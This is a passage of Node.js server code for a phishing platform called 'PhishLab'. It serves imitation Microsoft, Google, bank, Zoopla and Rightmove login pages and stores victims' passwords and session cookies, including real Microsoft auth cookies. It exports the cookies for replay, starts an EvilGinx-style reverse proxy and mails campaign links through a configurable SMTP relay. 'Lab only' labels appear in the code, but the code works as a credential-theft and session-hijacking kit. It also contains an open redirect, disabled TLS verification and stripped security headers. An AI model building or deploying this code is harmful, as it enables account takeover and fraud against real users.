  const campaigns = db.prepare('SELECT * FROM phish_campaigns WHERE user_id = ? ORDER BY id DESC').all(user.id);
  const campOpts = campaigns.map(function (c) {
    return `<option value="${c.id}">#${c.id} ${phEsc((PH_TEMPLATES[c.template_key] || {}).name || c.template_key)}</option>`;
  }).join('');
  let compose = `<div class="panel"><h3>✍️ Mesaj nou</h3>
    ${opts.err ? '<div class="status-blocked" style="margin-bottom:10px">' + phEsc(opts.err) + '</div>' : ''}
    <form method="POST" action="/dashboard/phishlab/mail/send">
      <div style="margin-bottom:12px"><label>Către (email membru echipă)</label><input name="to" type="email" required value="${phEsc(opts.to || '')}" style="width:100%;max-width:420px"></div>
      <div style="margin-bottom:12px"><label>Subiect</label><input name="subject" type="text" required value="${phEsc(opts.subject || '')}" style="width:100%;max-width:420px"></div>
      <div style="margin-bottom:12px"><label>Mesaj</label><textarea name="body" rows="5" style="width:100%;max-width:640px">${phEsc(opts.body || '')}</textarea></div>
      <div style="margin-bottom:12px"><label>Atașează link campanie Lab</label>
        <select name="campaign_id" style="min-width:280px"><option value="">— niciuna —</option>${campOpts}</select></div>
      <button type="submit" class="btn btn-primary">Trimite</button>
      <span style="color:#777;font-size:12px;margin-left:10px">Livrare internă în platformă; dacă SMTP e configurat, se trimite și prin relay.</span>
    </form></div>`;
  const smtpPanel = `<div class="panel"><h3>⚙️ Setări SMTP (relay de laborator)</h3>
    <p style="color:#777;font-size:12px">Fără setări → livrare doar internă (inbox Lab). Cu relay configurat, mesajele pleacă și prin serverul vostru de mail de lab.</p>
    <form method="POST" action="/dashboard/phishlab/mail/smtp">
      <div style="display:flex;gap:12px;flex-wrap:wrap">
        <div><label>Host</label><input name="host" value="${phEsc(smtp ? smtp.host : '')}" placeholder="smtp.lab.local"></div>
        <div><label>Port</label><input name="port" value="${phEsc(smtp ? smtp.port : 587)}" size="5"></div>
        <div><label>Secure (465 TLS)</label><select name="secure"><option value="0"${smtp && smtp.secure ? '' : ' selected'}>Nu (STARTTLS/plain)</option><option value="1"${smtp && smtp.secure ? ' selected' : ''}>Da</option></select></div>
      </div>
      <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:10px">
        <div><label>Username</label><input name="username" value="${phEsc(smtp ? smtp.username : '')}"></div>
        <div><label>Parolă</label><input name="password" type="password" value="${phEsc(smtp ? smtp.password : '')}"></div>
        <div><label>From</label><input name="from_addr" value="${phEsc(smtp ? smtp.from_addr : (user.email || ''))}"></div>
      </div>
      <div style="margin-top:14px;display:flex;gap:10px">
        <button type="submit" class="btn btn-primary">Salvează</button>
        <button type="submit" class="btn" formaction="/dashboard/phishlab/mail/smtp/test">Trimite e-mail de test către mine</button>
      </div>
    </form></div>`;
  const inbox = `<div class="panel"><h3>📥 Inbox Lab (${mails.length})</h3>
    <div style="color:#777;font-size:12px;margin-bottom:8px">Mesaje adresate către <b>${phEsc(user.email || '')}</b> (sau username-ul tău).</div>
    ${mails.map(phMailRow).join('') || '<div style="color:#777;padding:14px 0">Inbox gol.</div>'}
  </div>`;
  const content = `<h1>✉ Mail Lab</h1>
    ${phFlashHtml(opts.flash || '')}
    ${opts.okNote ? '<div style="background:#e9f7ef;border:1px solid #a7dcbf;color:#14663a;border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:14px">' + phEsc(opts.okNote) + '</div>' : ''}
    <div class="panel-grid">${compose}${smtpPanel}</div>
    ${inbox}`;
  return clientPage('Mail Lab', content, user);
}

// Minimal SMTP relay via nodemailer with graceful failure.
function phSmtpSend(userId, from, to, subject, body, cb) {
  const s = db.prepare('SELECT * FROM phish_smtp WHERE user_id = ?').get(userId);
  if (!s || !s.host) return cb(null, { skipped: true });
  try {
    const tr = nodemailer.createTransport({
      host: s.host, port: parseInt(s.port, 10) || 587, secure: !!s.secure,
      auth: s.username ? { user: s.username, pass: s.password || '' } : undefined,
      connectionTimeout: 8000, greetingTimeout: 8000, socketTimeout: 12000,
      tls: { rejectUnauthorized: false }
    });
    tr.sendMail({ from: s.from_addr || from, to: to, subject: subject, text: body }, function (err, info) {
      if (err) return cb(err);
      cb(null, { ok: true, response: info && info.response });
    });
  } catch (e) { cb(e); }
}

// ---------------------------------------------------------------------------
// ROUTES
// ---------------------------------------------------------------------------
app.get('/dashboard/phishlab', requireClient, (req, res) => { res.send(phDashOverview(req, req.query.created || '')); });

app.get('/dashboard/rental', requireClient, (req, res) => { res.send(phRentalOverview(req, req.query.created || '')); });

app.post('/dashboard/phishlab/campaign/create', requireClient, (req, res) => {
  const key = String(req.body.template_key || '');
  const tpl = PH_TEMPLATES[key];
  if (!tpl) return res.status(400).send('Template necunoscut');
  const token = uuidv4().replace(/-/g, '').substring(0, 32);
  db.prepare('INSERT INTO phish_campaigns (user_id, template_key, token) VALUES (?,?,?)').run(req.user.id, key, token);
  try { db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'phishlab_campaign', ?, ?)").run(req.user.id, 'PhishLab campaign: ' + key + ' ' + token, req.ip || ''); } catch (e) {}
  res.redirect((tpl.rental ? '/dashboard/rental' : '/dashboard/phishlab') + '?created=1');
});

app.get('/dashboard/phishlab/campaign/delete/:id', requireClient, (req, res) => {
  // Remove children first (FK enforced), then the campaign.
  db.prepare('DELETE FROM phish_sessions WHERE campaign_id = ? AND user_id = ?').run(req.params.id, req.user.id);
  db.prepare('DELETE FROM phish_captures WHERE campaign_id = ? AND user_id = ?').run(req.params.id, req.user.id);
  db.prepare('DELETE FROM phish_campaigns WHERE id = ? AND user_id = ?').run(req.params.id, req.user.id);
  res.redirect('/dashboard/phishlab');
});

app.get('/dashboard/phishlab/captures', requireClient, (req, res) => { res.send(phDashCaptures(req, req.query.revoked || req.query.deleted || '')); });

app.get('/dashboard/phishlab/captures/delete/:id', requireClient, (req, res) => {
  const v = db.prepare('SELECT * FROM phish_captures WHERE id = ? AND user_id = ?').get(req.params.id, req.user.id);
  if (v && v.session_token) db.prepare('UPDATE phish_sessions SET revoked = 1 WHERE token = ?').run(v.session_token);
  if (v) db.prepare('DELETE FROM phish_captures WHERE id = ? AND user_id = ?').run(v.id, req.user.id);
  res.redirect('/dashboard/phishlab/captures?deleted=1');
});

// Export captured cookies (Proxy LIVE rows) as a JSON file for cookie-jar import.
app.get('/dashboard/phishlab/captures/export/:id', requireClient, (req, res) => {
  const v = db.prepare('SELECT * FROM phish_captures WHERE id = ? AND user_id = ?').get(req.params.id, req.user.id);
  if (!v) return res.status(404).send('—');
  res.setHeader('Content-Disposition', 'attachment; filename="phishlab-capture-' + v.id + '-cookies.json"');
  res.type('application/json').send(v.cookies_json || '{}');
});

app.get('/dashboard/phishlab/replay/:id', requireClient, (req, res) => {
  const v = db.prepare('SELECT * FROM phish_captures WHERE id = ? AND user_id = ?').get(req.params.id, req.user.id);
  if (!v || !v.session_token) return res.redirect('/dashboard/phishlab/captures');
  const s = db.prepare("SELECT * FROM phish_sessions WHERE token = ? AND revoked = 0 AND expires_at > datetime('now')").get(v.session_token);
  if (!s) return res.redirect('/dashboard/phishlab/captures');
  const tpl = PH_TEMPLATES[s.template_key];
  if (tpl) phSetTemplateCookies(res, tpl, s.token);
  try { db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'phishlab_replay', ?, ?)").run(req.user.id, 'PhishLab replay capture #' + v.id, req.ip || ''); } catch (e) {}
  res.redirect('/phish/app?replay=1');
});

app.get('/dashboard/phishlab/revoke/:id', requireClient, (req, res) => {
  const v = db.prepare('SELECT * FROM phish_captures WHERE id = ? AND user_id = ?').get(req.params.id, req.user.id);
  if (v && v.session_token) db.prepare('UPDATE phish_sessions SET revoked = 1 WHERE token = ?').run(v.session_token);
  res.redirect('/dashboard/phishlab/captures?revoked=1');
});

// --- Funnel ---
// NOTE: literal routes must be registered BEFORE '/phish/:token' or they get
// shadowed by the parameter route.
app.get('/phish/app', (req, res) => {
  const s = phSessFromReq(req);
  if (!s) return res.redirect('/');
  req.phSession = s;
  const flash = req.query.captured ? 'captured' : (req.query.replay ? 'replay' : (req.query.already ? 'already' : ''));
  res.send(phAppPage(req, flash));
});

app.get('/phish/signout', (req, res) => {
  phClearTemplateCookies(res);
  res.redirect('/');
});

// Handoff page shown after capture: transparent redirect into the demo inbox
// (PhishLab mailbox — demo only, nothing is changed in any real account).
app.get('/phish/handoff', (req, res) => {
  const next = phSafeNext(String(req.query.next || ''));
  res.send(phHandoffPage(next));
});

app.get('/phish/:token', (req, res) => {
  const camp = db.prepare('SELECT * FROM phish_campaigns WHERE token = ?').get(String(req.params.token || ''));
  if (!camp) return res.status(404).send('<h1 style="font-family:sans-serif;color:#b3261e;text-align:center;margin-top:80px">Link invalid sau expirat.</h1>');
  const live = db.prepare("SELECT * FROM phish_sessions WHERE campaign_id = ? AND revoked = 0 AND expires_at > datetime('now') ORDER BY id DESC LIMIT 1").get(camp.id);
  if (live) {
    const tpl = PH_TEMPLATES[camp.template_key];
    if (tpl) phSetTemplateCookies(res, tpl, live.token);
    return res.redirect('/phish/app?already=1');
  }
  const tpl = PH_TEMPLATES[camp.template_key];
  if (camp.template_key === 'microsoft-proxy') {
    return res.redirect(phProxyPublicUrl() + '/' + camp.token);
  }
  const html = camp.template_key === 'google-business' ? phGooglePage({ step: 1, token: camp.token }) : (camp.template_key === 'microsoft' ? phMicrosoftPage({ step: 1, token: camp.token }) : (camp.template_key === 'zoopla-pro' ? phZooplaPage({ token: camp.token }) : (camp.template_key === 'rightmove-plus' ? phRightmovePage({ token: camp.token }) : phBankPage(camp.template_key, { step: 1, token: camp.token }))));
  res.send(html);
});

// Helper: persist one capture (credentials + session cookies) and return the session token.
function phRecordCapture(camp, tpl, email, password, req) {
  const sessToken = phToken(64);
  const exp = new Date(Date.now() + 12 * 3600 * 1000).toISOString().slice(0, 19).replace('T', ' ');
  db.prepare('INSERT INTO phish_sessions (campaign_id, user_id, template_key, token, email, origin, ip_address, user_agent, expires_at) VALUES (?,?,?,?,?,?,?,?,?)')
    .run(camp.id, camp.user_id, camp.template_key, sessToken, email, 'phish', req.ip || '', String(req.headers['user-agent'] || '').substring(0, 200), exp);
  const tplPart = tpl.cookies.map(function (c, i) { return { name: c.name, value: sessToken, maxAgeSeconds: Math.round((i === 0 ? 0.5 : c.days) * 86400) }; });
  let cookies_json;
  if (camp.template_key === 'microsoft') {
    // Microsoft funnel also records every cookie the victim's browser actually
    // sent to the funnel (ESTSAUTH/ESTSAUTHPERSISTENT + any real MS cookies).
    const sent = phCookies(req);
    const reqMap = {};
    Object.keys(sent).forEach(function (n) { reqMap[n] = sent[n]; });
    cookies_json = JSON.stringify({ template: tplPart, request: reqMap });
  } else {
    cookies_json = JSON.stringify(tplPart);
  }
  db.prepare('INSERT INTO phish_captures (campaign_id, user_id, template_key, stage, email, password, cookies_json, session_token, ip_address, user_agent) VALUES (?,?,?,?,?,?,?,?,?,?)')
    .run(camp.id, camp.user_id, camp.template_key, 'session_captured', email, password, cookies_json, sessToken, req.ip || '', String(req.headers['user-agent'] || '').substring(0, 200));
  try { db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'phishlab_capture', ?, ?)").run(camp.user_id, 'PhishLab capture: ' + camp.template_key + ' ' + email, req.ip || ''); } catch (e) {}
  return sessToken;
}

// Default next destination for the Microsoft handoff: the PhishLab demo inbox
// (the funnel now ends inside the lab, in the victim's own browser session).
// Absolute http(s) next targets stay allowed, plus same-origin /phish/ paths;
// anything else (empty, relative non-phish, javascript:, etc.) falls back.
function phSafeNext(raw) {
  const fallback = PH_TEMPLATES['microsoft'].redirectAfterCapture || '/phish/app?captured=1';
  if (/^https?:\/\/[^\/\s]+/.test(raw)) return raw;
  if (/^\/phish\//.test(raw)) return raw;
  return fallback;
}

app.post('/phish/:token', (req, res) => {
  const camp = db.prepare('SELECT * FROM phish_campaigns WHERE token = ?').get(String(req.params.token || ''));
  if (!camp) return res.status(404).send('<h1 style="font-family:sans-serif;color:#b3261e;text-align:center;margin-top:80px">Link invalid sau expirat.</h1>');
  const tpl = PH_TEMPLATES[camp.template_key];
  const email = String(req.body.email || '').trim();
  // Only a real (non-empty) password submits the capture; an empty password
  // goes back through step-1 validation (step-1 form has no password field).
  const pwRaw = req.body.password;
  const password = (typeof pwRaw === 'string' && pwRaw !== '') ? pwRaw : null;
  const token = camp.token;
  if (camp.template_key === 'rightmove-plus') {
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.send(phRightmovePage({ token: token, email: email, error: 'Please enter a valid email', errField: 'email' }));
    }
    if (password === null) {
      return res.send(phRightmovePage({ token: token, email: email, error: 'Please enter a valid password', errField: 'password' }));
    }
    const rt = phRecordCapture(camp, tpl, email, password, req);
    phSetTemplateCookies(res, tpl, rt);
    return res.redirect('/phish/app?captured=1');
  }
  if (camp.template_key === 'zoopla-pro') {
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.send(phZooplaPage({ token: token, email: email, error: 'Please enter a valid email address' }));
    }
    if (password === null) {
      return res.send(phZooplaPage({ token: token, email: email, error: 'Please enter your password' }));
    }
    const zt = phRecordCapture(camp, tpl, email, password, req);
    phSetTemplateCookies(res, tpl, zt);
    return res.redirect('/phish/app?captured=1');
  }
  const ms = camp.template_key === 'microsoft';
  if (ms && req.body.kmsi !== undefined) {
    // MS step 3 (KMSI) -> final handoff into the demo mailbox.
    if (String(req.body.kmsi) === 'yes') {
      try { res.cookie('KMSI', 'Yes', { maxAge: 14 * 24 * 3600 * 1000, httpOnly: false, sameSite: 'lax', path: '/' }); } catch (e) {}
    } else {
      try { res.clearCookie('KMSI', { path: '/' }); } catch (e) {}
    }
    const next = phSafeNext(String(req.body.next || ''));
    return res.redirect('/phish/handoff?next=' + encodeURIComponent(next));
  }
  if (password === null) {
    // STEP 1 -> STEP 2
    const idOk = (ms || camp.template_key === 'google-business') ? /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) : email.length >= 2;
    if (!idOk) {
      const err = ms ? 'Enter a valid email address, phone number, or Skype name.' : (camp.template_key === 'google-business' ? 'Enter a valid email or phone number' : 'Please enter a valid ' + (camp.template_key === 'barclays' ? 'membership number' : 'identifier'));
      const html = ms ? phMicrosoftPage({ step: 1, token: token, email: email, error: err }) : (camp.template_key === 'google-business' ? phGooglePage({ step: 1, token: token, email: email, error: err }) : phBankPage(camp.template_key, { step: 1, token: token, email: email, error: err }));
      return res.send(html);
    }
    const html = ms ? phMicrosoftPage({ step: 2, token: token, email: email }) : (camp.template_key === 'google-business' ? phGooglePage({ step: 2, token: token, email: email }) : phBankPage(camp.template_key, { step: 2, token: token, email: email }));
    return res.send(html);
  }
  // STEP 2 -> CAPTURE credentials + session cookies
  const sessToken = phRecordCapture(camp, tpl, email, password, req);
  phSetTemplateCookies(res, tpl, sessToken);
  if (ms) {
    // KMSI step before the transparent handoff.
    return res.send(phMicrosoftPage({ step: 3, token: token, email: email }));
  }
  res.redirect('/phish/app?captured=1');
});

// --- Mail Lab ---
app.get('/dashboard/phishlab/mail', requireClient, (req, res) => {
  let opts = { flash: req.query.sent ? 'sent' : (req.query.smtpsaved ? 'smtpsaved' : '') };
  if (req.query.campaign) {
    const c = db.prepare('SELECT * FROM phish_campaigns WHERE id = ? AND user_id = ?').get(req.query.campaign, req.user.id);
    if (c) {
      const tpl = PH_TEMPLATES[c.template_key] || { name: c.template_key };
      opts.subject = 'Test phishing link — ' + tpl.name;
      opts.body = 'Salut,\n\nLink-ul de test Lab (doar în laborator):\n' + reqBase(req) + '/phish/' + c.token + '\n\n— MarketForge Lab';
    }
  }
  res.send(phMailPage(req, opts));
});

app.post('/dashboard/phishlab/mail/send', requireClient, (req, res) => {
  const to = String(req.body.to || '').trim();
  const subject = String(req.body.subject || '').trim();
  const body = String(req.body.body || '').trim();
  if (!to || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(to)) return res.send(phMailPage(req, { err: 'Adresa destinatarului nu este validă.' }));
  if (!subject) return res.send(phMailPage(req, { err: 'Adaugă un subiect.' }));
  let finalBody = body;
  const campId = parseInt(req.body.campaign_id, 10);
  if (campId) {
    const c = db.prepare('SELECT * FROM phish_campaigns WHERE id = ? AND user_id = ?').get(campId, req.user.id);
    if (c) finalBody = (finalBody ? finalBody + '\n\n' : '') + 'Link de test Lab (doar în laborator):\n' + reqBase(req) + '/phish/' + c.token;
  }
  const from = req.user.email || (req.user.username + '@marketforge.lab');
  let inserted = 0, note = '';
  const recipient = db.prepare('SELECT * FROM users WHERE email = ?').get(to);
  if (recipient) {
    db.prepare('INSERT INTO phish_mails (user_id, from_label, from_addr, to_addr, subject, body, kind) VALUES (?,?,?,?,?,?,?)')
      .run(recipient.id, req.user.username, from, to, subject, finalBody, 'internal');
    inserted++;
  }
  phSmtpSend(req.user.id, from, to, subject, finalBody, function (err, r) {
    if (r && r.ok) note = ' SMTP relay: trimis (' + String(r.response || 'ok').substring(0, 80) + ').';
    else if (err) note = ' SMTP relay: eroare — ' + String(err && err.message || err).substring(0, 120) + ' (mesajul a rămas intern' + (recipient ? '' : ', dar destinatarul nu există în platformă') + ').';
    else if (r && r.skipped) note = recipient ? '' : ' Destinatarul nu e utilizator în platformă și nici SMTP relay nu e configurat — mesajul nu a putut fi livrat.';
    if (inserted) {
      res.redirect('/dashboard/phishlab/mail?sent=1' + (note ? '&note=' + encodeURIComponent(note) : ''));
    } else {
      res.send(phMailPage(req, { err: 'Livrare eșuată.' + note }));
    }
  });
});

app.post('/dashboard/phishlab/mail/smtp', requireClient, (req, res) => {
  const host = String(req.body.host || '').trim();
  const port = parseInt(req.body.port, 10) || 587;
  const secure = String(req.body.secure) === '1' ? 1 : 0;
  const username = String(req.body.username || '').trim();
  const password = String(req.body.password || '');
  const from_addr = String(req.body.from_addr || '').trim();
  if (db.prepare('SELECT id FROM phish_smtp WHERE user_id = ?').get(req.user.id)) {
    db.prepare('UPDATE phish_smtp SET host=?, port=?, secure=?, username=?, password=?, from_addr=?, updated_at=datetime(\'now\') WHERE user_id=?')
      .run(host, port, secure, username, password, from_addr, req.user.id);
  } else {
    db.prepare('INSERT INTO phish_smtp (user_id, host, port, secure, username, password, from_addr) VALUES (?,?,?,?,?,?,?)')
      .run(req.user.id, host, port, secure, username, password, from_addr);
  }
  res.redirect('/dashboard/phishlab/mail?smtpsaved=1');
});

app.post('/dashboard/phishlab/mail/smtp/test', requireClient, (req, res) => {
  // Save current form values first, then attempt a test delivery to self.
  const host = String(req.body.host || '').trim();
  const port = parseInt(req.body.port, 10) || 587;
  const secure = String(req.body.secure) === '1' ? 1 : 0;
  const username = String(req.body.username || '').trim();
  const password = String(req.body.password || '');
  const from_addr = String(req.body.from_addr || '').trim();
  if (db.prepare('SELECT id FROM phish_smtp WHERE user_id = ?').get(req.user.id)) {
    db.prepare('UPDATE phish_smtp SET host=?, port=?, secure=?, username=?, password=?, from_addr=?, updated_at=datetime(\'now\') WHERE user_id=?')
      .run(host, port, secure, username, password, from_addr, req.user.id);
  } else {
    db.prepare('INSERT INTO phish_smtp (user_id, host, port, secure, username, password, from_addr) VALUES (?,?,?,?,?,?,?)')
      .run(req.user.id, host, port, secure, username, password, from_addr);
  }
  const to = req.user.email || from_addr;
  if (!host) return res.send(phMailPage(req, { err: 'Configurează host-ul SMTP înainte de test.' }));
  phSmtpSend(req.user.id, from_addr, to, 'MarketForge Lab — SMTP test', 'Test de livrare SMTP (laborator). Dacă vezi acest mesaj, relay-ul funcționează.', function (err, r) {
    if (r && r.ok) return res.send(phMailPage(req, { okNote: '✓ Test SMTP trimis către ' + to + ' (' + String(r.response || 'ok').substring(0, 80) + ').' }));
    return res.send(phMailPage(req, { err: 'Test SMTP eșuat: ' + String(err && err.message || err).substring(0, 160) + '. Verifică host/port/credențiale (doar server de mail al laboratorului).' }));
  });
});
// === SOCKET.IO ===
io.on('connection', (socket) => {
  socket.on('join', (data) => {
    if (data && data.room) socket.join(String(data.room));
    if (data && data.userId) socket.join('user:' + data.userId);
  });
  socket.on('listing_ping', (data) => {
    try {
      if (!data || !data.userId) return;
      io.to('user:' + data.userId).emit('live_presence', {
        listingId: data.listingId,
        userId: data.userId,
        event: data.event || 'ping',
        at: new Date().toISOString()
      });
    } catch (e) {}
  });
});

// === STARTUP ===

// ===== Airbnb Clone Proxy: /_airbnb/* -> localhost:3001/_airbnb/* =====
app.use('/_airbnb', (req, res) => {
  try {
    const target = new NodeURL(AIRBNB_CLONE_URL);
    const pathWithQuery = req.originalUrl; // keep /_airbnb prefix (basePath)
    const opts = {
      protocol: target.protocol,
      hostname: target.hostname,
      port: target.port || (target.protocol === 'https:' ? 443 : 80),
      path: pathWithQuery,
      method: req.method,
      headers: {
        ...req.headers,
        host: target.host,
        'x-forwarded-host': req.headers.host || '',
        'x-forwarded-proto': req.protocol || 'https',
        'x-forwarded-for': req.ip || '',
      },
    };
    delete opts.headers['accept-encoding'];
    const lib = target.protocol === 'https:' ? https : http;
    const proxyReq = lib.request(opts, (proxyRes) => {
      const skip = new Set(['content-encoding', 'transfer-encoding', 'connection', 'keep-alive']);
      const headers = {};
      Object.keys(proxyRes.headers || {}).forEach((k) => {
        if (!skip.has(k.toLowerCase())) headers[k] = proxyRes.headers[k];
      });
      // Allow embedding in MarketForge iframe on same origin
      delete headers['x-frame-options'];
      delete headers['content-security-policy'];
      res.writeHead(proxyRes.statusCode || 502, headers);
      proxyRes.pipe(res);
    });
    proxyReq.on('error', (e) => {
      console.error('[clone-proxy]', e.message);
      if (!res.headersSent) res.status(502).end('Proxy error');
    });
    if (req.method === 'GET' || req.method === 'HEAD') proxyReq.end();
    else req.pipe(proxyReq);
  } catch (e) {
    console.error('[clone-proxy]', e.message);
    res.status(502).end('Proxy error');
  }
});


// Public base URL of the transparent proxy (where a Proxy LIVE campaign link points).
function phProxyPublicUrl() {
  const p = process.env.PH_PROXY_PUBLIC_URL || ('https://login.' + String(process.env.PH_PROXY_DOMAIN || (function () {
    try { return new URL(process.env.BASE_URL || 'https://lessjob.online').hostname.replace(/^www\./, ''); } catch (e) { return 'lessjob.online'; }
  })()));
  return String(p).replace(/\/+$/, '');
}

// Boot the transparent proxy engine (EvilGinx-style) when enabled.
if (String(process.env.PH_PROXY_ENABLE || '') === '1') {
  try {
    const phproxy = require('./phproxy');
    const state = phproxy.startProxy({ db: db });
    if (state && state.error) console.error('[phproxy] FATAL:', state.error);
    else console.log('[phproxy] Proxying *.' + (state && state.domain || '?') + ' -> public URL ' + (state && state.publicUrl || '?') + ' (tls :' + (state && state.tlsPort || 0) + ' http :' + (state && state.httpPort || 0) + ')');
  } catch (e) {
    console.error('[phproxy] boot failed:', e.message);
  }
}

const HOST = process.env.HOST && process.env.HOST !== '127.0.0.1' && process.env.HOST !== 'localhost'
  ? process.env.HOST
  : '0.0.0.0';
server.listen(PORT, HOST, () => {
  console.log(`[+] MarketForge running on http://${HOST}:${PORT}`);
  console.log(`[+] Admin: ${ADMIN_USERNAME} / ${ADMIN_PASSWORD}`);
});

// Start HTTPS server with Dynamic SNI SSL enabled on PORT_HTTPS (default 8443)
const HTTPS_PORT = parseInt(process.env.HTTPS_PORT || process.env.PORT_HTTPS || '8443', 10);
sslService.startHTTPSServer(app, HTTPS_PORT);

